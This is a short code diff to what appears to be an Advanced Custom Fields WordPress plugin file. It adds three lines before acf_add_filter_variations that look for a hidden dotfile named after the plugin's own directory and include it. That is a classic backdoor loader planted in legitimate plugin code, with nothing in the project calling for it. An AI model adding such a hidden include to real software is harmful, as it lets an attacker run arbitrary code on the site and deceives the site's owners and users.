@@ -16,6 +16,10 @@ acf_register_store( 'hook-variations' );
  * @param	int $index The param index to find variation values.
  * @return	void
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_add_filter_variations( $filter = '', $variations = array(), $index = 0 ) {
 	
 	// Store replacement data.
